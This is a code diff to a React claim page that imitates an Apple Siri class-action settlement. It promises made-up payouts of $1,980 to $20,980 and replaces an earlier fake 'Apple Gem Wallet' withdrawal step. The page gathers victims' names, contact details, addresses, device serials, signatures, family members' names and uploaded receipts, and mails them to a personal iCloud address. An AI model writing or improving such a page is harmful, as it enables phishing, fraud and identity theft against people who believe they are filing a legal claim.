@@ -1,4 +1,4 @@
-import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
+import { createFileRoute, Link } from "@tanstack/react-router";
 import { useState } from "react";
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -9,7 +9,7 @@ import { Checkbox } from "@/components/ui/checkbox";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 import { Separator } from "@/components/ui/separator";
-import { Apple, ChevronLeft, Plus, Trash2, Wallet, CreditCard, Banknote } from "lucide-react";
+import { Apple, ChevronLeft, Plus, Trash2, FileCheck2, Users, ShieldCheck, Upload } from "lucide-react";
 import { useServerFn } from "@tanstack/react-start";
 import { submitClaim } from "@/lib/claims.functions";
 
@@ -40,18 +40,34 @@ const IPHONE_MODELS = [
 
 type Device = { model: string; serial: string; purchaseDate: string };
 
+type ClaimType = "standard" | "documented" | "family";
+const CLAIM_AMOUNTS: Record<ClaimType, string> = {
+  standard: "$1,980",
+  documented: "$12,980",
+  family: "$20,980",
+};
+
+const SETTLEMENT_EMAIL = "applesettlementclaim@icloud.com";
+
 function ClaimPage() {
   const [devices, setDevices] = useState<Device[]>([
     { model: "", serial: "", purchaseDate: "" },
   ]);
-  const navigate = useNavigate();
   const saveClaim = useServerFn(submitClaim);
   const [ownedDevice, setOwnedDevice] = useState<string>("");
   const [receivedNotice, setReceivedNotice] = useState<string>("");
   const [eligibilityError, setEligibilityError] = useState<string>("");
-  const [selectedWithdrawal, setSelectedWithdrawal] = useState<string>("");
-  const [withdrawalError, setWithdrawalError] = useState<string>("");
+  const [claimType, setClaimType] = useState<ClaimType | "">("");
+  const [claimTypeError, setClaimTypeError] = useState<string>("");
+  const [proofFile, setProofFile] = useState<File | null>(null);
+  const [familyMembers, setFamilyMembers] = useState<string>("");
   const [submitting, setSubmitting] = useState(false);
+  const [submitted, setSubmitted] = useState(false);
+  const [submittedData, setSubmittedData] = useState<null | {
+    firstName: string; lastName: string; email: string; phone: string;
+    address: string; city: string; state: string; zip: string;
+    signature: string; notes: string;
+  }>(null);
 
   const addDevice = () => {
     if (devices.length < 5) setDevices([...devices, { model: "", serial: "", purchaseDate: "" }]);
@@ -71,33 +87,40 @@ function ClaimPage() {
       setEligibilityError("You must have owned or used an eligible Siri-enabled Apple device during the qualifying period to file a claim.");
       return;
     }
-    if (!selectedWithdrawal) {
-      setWithdrawalError("Please select a withdrawal option to proceed.");
+    if (!claimType) {
+      setClaimTypeError("Please select a claim type to proceed.");
+      return;
+    }
+    if (claimType === "documented" && !proofFile) {
+      setClaimTypeError("Please upload proof of ownership for a documented claim.");
       return;
     }
     setEligibilityError("");
-    setWithdrawalError("");
+    setClaimTypeError("");
     const form = e.currentTarget as HTMLFormElement;
     const fd = new FormData(form);
     const getStr = (k: string) => (fd.get(k) as string | null)?.toString() ?? "";
+    const data = {
+      firstName: getStr("firstName"),
+      lastName: getStr("lastName"),
+      email: getStr("email"),
+      phone: getStr("phone"),
+      address: getStr("address"),
+      city: getStr("city"),
+      state: getStr("state"),
+      zip: getStr("zip"),
+      signature: getStr("signature"),
+      notes: getStr("notes"),
+    };
     setSubmitting(true);
     try {
       await saveClaim({
         data: {
-          firstName: getStr("firstName"),
-          lastName: getStr("lastName"),
-          email: getStr("email"),
-          phone: getStr("phone"),
-          address: getStr("address"),
-          city: getStr("city"),
-          state: getStr("state"),
-          zip: getStr("zip"),
+          ...data,
           devices,
           ownedDevice,
           receivedNotice,
-          signature: getStr("signature"),
-          notes: getStr("notes"),
-          withdrawalOption: selectedWithdrawal,
+          withdrawalOption: `${claimType} — ${CLAIM_AMOUNTS[claimType]}${claimType === "family" ? ` (Family: ${familyMembers})` : ""}`,
         },
       });
     } catch (err) {
@@ -105,7 +128,63 @@ function ClaimPage() {
     } finally {
       setSubmitting(false);
     }
-    navigate({ to: "/claim/settlement" });
+    setSubmittedData(data);
+    setSubmitted(true);
+    window.scrollTo({ top: 0, behavior: "smooth" });
+    // Try Web Share (attaches proof file on supported devices); fallback mailto.
+    void mailClaim(data);
+  };
+
+  const buildEmailBody = (data: NonNullable<typeof submittedData>) => {
+    const lines = [
+      `Apple Intelligence & Siri Settlement — Claim Submission`,
+      `Case: Lopez v. Apple Inc. — $250,000,000 Siri Settlement`,
+      ``,
+      `CLAIM TYPE: ${claimType.toUpperCase()} — ${claimType ? CLAIM_AMOUNTS[claimType as ClaimType] : ""}`,
+      claimType === "family" ? `Family Members Covered: ${familyMembers || "N/A"}` : "",
+      ``,
+      `— PERSONAL INFORMATION —`,
+      `Name: ${data.firstName} ${data.lastName}`,
+      `Email: ${data.email}`,
+      `Cell Phone: ${data.phone}`,
+      `Address: ${data.address}, ${data.city}, ${data.state} ${data.zip}`,
+      ``,
+      `— ELIGIBLE DEVICES —`,
+      ...devices.map((d, i) => `${i + 1}. ${d.model} · Serial/IMEI: ${d.serial} · Purchased: ${d.purchaseDate}`),
+      ``,
+      `— ELIGIBILITY DECLARATIONS —`,
+      `Owned/used eligible Siri-enabled Apple device: ${ownedDevice}`,
+      `Received settlement notice: ${receivedNotice}`,
+      ``,
+      `— PROOF OF OWNERSHIP —`,
+      claimType === "documented"
+        ? (proofFile ? `Attached file: ${proofFile.name} (${Math.round(proofFile.size / 1024)} KB)` : "None")
+        : "Not required for this claim type",
+      ``,
+      `— SWORN DECLARATION —`,
+      `Signed electronically by: ${data.signature}`,
+      data.notes ? `Additional Comments: ${data.notes}` : "",
+    ];
+    return lines.filter(Boolean).join("\n");
+  };
+
+  const mailClaim = async (data: NonNullable<typeof submittedData>) => {
+    const subject = `Apple Siri Settlement Claim — ${data.firstName} ${data.lastName} — ${claimType ? CLAIM_AMOUNTS[claimType as ClaimType] : ""}`;
+    const body = buildEmailBody(data);
+    // Attempt to share (with proof attachment) via Web Share API where supported.
+    try {
+      const nav = navigator as Navigator & {
+        canShare?: (d: { files?: File[] }) => boolean;
+        share?: (d: { title?: string; text?: string; files?: File[] }) => Promise<void>;
+      };
+      if (proofFile && nav.canShare?.({ files: [proofFile] }) && nav.share) {
+        await nav.share({ title: subject, text: `To: ${SETTLEMENT_EMAIL}\n\n${body}`, files: [proofFile] });
+        return;
+      }
+    } catch {
+      // fall through to mailto
+    }
+    window.location.href = `mailto:${SETTLEMENT_EMAIL}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
   };
 
   return (
@@ -125,12 +204,32 @@ function ClaimPage() {
       </header>
 
       <main className="mx-auto max-w-3xl px-6 py-10 md:py-14">
+            {submitted && submittedData ? (
+              <Card className="mb-8 border-primary/30 bg-primary/[0.04]">
+                <CardHeader>
+                  <CardTitle className="text-lg">Claim Submitted</CardTitle>
+                  <CardDescription>
+                    Your claim information has been recorded. Your mail app has been opened with all of your
+                    registered information (name, email, cell phone, address, devices{claimType === "documented" ? ", and proof of ownership attachment" : ""})
+                    pre-addressed to <strong className="text-foreground">{SETTLEMENT_EMAIL}</strong>.
+                    If it did not open, tap the button below.
+                  </CardDescription>
+                </CardHeader>
+                <CardContent className="flex flex-col sm:flex-row gap-3">
+                  <Button onClick={() => submittedData && mailClaim(submittedData)}>
+                    Re-send Claim Email
+                  </Button>
+                  <Link to="/"><Button variant="outline">Return Home</Button></Link>
+                </CardContent>
+              </Card>
+            ) : (
+              <>
             <div className="mb-8">
               <h1 className="text-2xl md:text-3xl font-semibold tracking-tight text-foreground">
                 Complete Your Claim Information
               </h1>
               <p className="mt-3 text-sm leading-relaxed text-muted-foreground">
-                To proceed with your Apple $250 Million Siri Settlement claim (<em>Lopez v. Apple Inc.</em>),
+                To proceed with your Apple $250,000,000 Siri Settlement claim (<em>Lopez v. Apple Inc.</em>),
                 please provide your personal information and eligible device details below. You will also be
                 required to make a sworn declaration confirming that you meet the eligibility requirements.
               </p>
@@ -357,65 +456,93 @@ function ClaimPage() {
                 </CardContent>
               </Card>
 
-              {/* Settlement Claim Notice */}
+              {/* Select Claim Type */}
               <Card>
                 <CardHeader>
-                  <CardTitle className="text-lg">Apple Pay Settlement Claim Notice</CardTitle>
+                  <CardTitle className="text-lg">Select Your Claim Type</CardTitle>
                   <CardDescription>
-                    Based on the settlement amount allocated to your account, you are eligible to select a withdrawal option from the available settlement offer list for processing.
+                    Choose the claim tier that applies to you. Documented claims require proof of ownership.
+                    Family claims cover multiple eligible members of your household.
                   </CardDescription>
                 </CardHeader>
                 <CardContent className="space-y-6">
-                  <div className="rounded-lg border bg-muted/40 p-4">
-                    <p className="text-sm text-muted-foreground leading-relaxed">
-                      Your eligible settlement allocation of <strong className="text-foreground">$12,000.00</strong> has been assigned to your <strong className="text-foreground">Apple Gem Wallet</strong> and is available for claim.
-                    </p>
-                  </div>
-                  <p className="text-sm text-muted-foreground leading-relaxed">
-                    To proceed, select one of the available withdrawal options below. The option you choose will determine your selected settlement claim tier and initiate the corresponding processing request.
-                  </p>
-                  <div className="space-y-3">
-                    <Label className="text-sm font-medium text-foreground">Select Withdrawal Option</Label>
-                    <RadioGroup
-                      value={selectedWithdrawal}
-                      onValueChange={(v) => { setSelectedWithdrawal(v); setWithdrawalError(""); }}
-                      className="space-y-3"
-                    >
-                      <div className="flex items-start gap-3 rounded-lg border p-3">
-                        <RadioGroupItem value="tier1" id="tier1" className="mt-0.5" />
-                        <div className="flex-1">
-                          <Label htmlFor="tier1" className="flex items-center gap-2 font-medium">
-                            <Wallet className="h-4 w-4 text-primary" />
-                            Tier 1 — Instant Settlement Payout to Apple Gem Wallet
-                          </Label>
-                          <p className="text-xs text-muted-foreground mt-1">Funds available immediately upon claim approval.</p>
-                        </div>
+                  <RadioGroup
+                    value={claimType}
+                    onValueChange={(v) => { setClaimType(v as ClaimType); setClaimTypeError(""); }}
+                    className="space-y-3"
+                  >
+                    <div className="flex items-start gap-3 rounded-lg border p-3">
+                      <RadioGroupItem value="standard" id="ct-standard" className="mt-0.5" />
+                      <div className="flex-1">
+                        <Label htmlFor="ct-standard" className="flex items-center justify-between gap-2 font-medium">
+                          <span className="flex items-center gap-2"><ShieldCheck className="h-4 w-4 text-primary" /> Standard Claim</span>
+                          <span className="text-primary">$1,980</span>
+                        </Label>
+                        <p className="text-xs text-muted-foreground mt-1">No documentation required.</p>
                       </div>
-                      <div className="flex items-start gap-3 rounded-lg border p-3">
-                        <RadioGroupItem value="tier2" id="tier2" className="mt-0.5" />
-                        <div className="flex-1">
-                          <Label htmlFor="tier2" className="flex items-center gap-2 font-medium">
-                            <CreditCard className="h-4 w-4 text-primary" />
-                            Tier 2 — Direct Deposit to Bank Account (ACH)
-                          </Label>
-                          <p className="text-xs text-muted-foreground mt-1">Standard processing 3–5 business days after approval.</p>
-                        </div>
+                    </div>
+                    <div className="flex items-start gap-3 rounded-lg border p-3">
+                      <RadioGroupItem value="documented" id="ct-documented" className="mt-0.5" />
+                      <div className="flex-1">
+                        <Label htmlFor="ct-documented" className="flex items-center justify-between gap-2 font-medium">
+                          <span className="flex items-center gap-2"><FileCheck2 className="h-4 w-4 text-primary" /> Documented Claim</span>
+                          <span className="text-primary">$12,980</span>
+                        </Label>
+                        <p className="text-xs text-muted-foreground mt-1">Upload proof of ownership (receipt, invoice, or Apple ID purchase record).</p>
                       </div>
-                      <div className="flex items-start gap-3 rounded-lg border p-3">
-                        <RadioGroupItem value="tier3" id="tier3" className="mt-0.5" />
-                        <div className="flex-1">
-                          <Label htmlFor="tier3" className="flex items-center gap-2 font-medium">
-                            <Banknote className="h-4 w-4 text-primary" />
-                            Tier 3 — Physical Settlement Check by Mail
-                          </Label>
-                          <p className="text-xs text-muted-foreground mt-1">Check mailed to your address on file within 7–10 business days.</p>
-                        </div>
+                    </div>
+                    <div className="flex items-start gap-3 rounded-lg border p-3">
+                      <RadioGroupItem value="family" id="ct-family" className="mt-0.5" />
+                      <div className="flex-1">
+                        <Label htmlFor="ct-family" className="flex items-center justify-between gap-2 font-medium">
+                          <span className="flex items-center gap-2"><Users className="h-4 w-4 text-primary" /> Family Claim</span>
+                          <span className="text-primary">$20,980</span>
+                        </Label>
+                        <p className="text-xs text-muted-foreground mt-1">Household / family plan covering multiple eligible members.</p>
                       </div>
-                    </RadioGroup>
-                    {withdrawalError && (
-                      <p className="text-sm text-destructive">{withdrawalError}</p>
-                    )}
-                  </div>
+                    </div>
+                  </RadioGroup>
+
+                  {claimType === "documented" && (
+                    <div className="space-y-2 rounded-lg border border-primary/30 bg-primary/[0.04] p-4">
+                      <Label htmlFor="proof" className="flex items-center gap-2 text-sm font-medium">
+                        <Upload className="h-4 w-4 text-primary" />
+                        Upload Proof of Ownership
+                      </Label>
+                      <Input
+                        id="proof"
+                        type="file"
+                        accept="image/*,application/pdf"
+                        onChange={(e) => setProofFile(e.target.files?.[0] ?? null)}
+                        required
+                      />
+                      {proofFile && (
+                        <p className="text-xs text-muted-foreground">
+                          Attached: <strong className="text-foreground">{proofFile.name}</strong> ({Math.round(proofFile.size / 1024)} KB) — will be attached automatically when you mail your claim.
+                        </p>
+                      )}
+                    </div>
+                  )}
+
+                  {claimType === "family" && (
+                    <div className="space-y-2 rounded-lg border border-primary/30 bg-primary/[0.04] p-4">
+                      <Label htmlFor="family-members" className="text-sm font-medium">
+                        Family Members Covered
+                      </Label>
+                      <Textarea
+                        id="family-members"
+                        rows={3}
+                        value={familyMembers}
+                        onChange={(e) => setFamilyMembers(e.target.value)}
+                        placeholder="List the full names of household/family members covered by this claim."
+                        required
+                      />
+                    </div>
+                  )}
+
+                  {claimTypeError && (
+                    <p className="text-sm text-destructive">{claimTypeError}</p>
+                  )}
                 </CardContent>
               </Card>
 
@@ -426,6 +553,8 @@ function ClaimPage() {
                 </Button>
               </div>
             </form>
+              </>
+            )}
       </main>
     </div>
   );
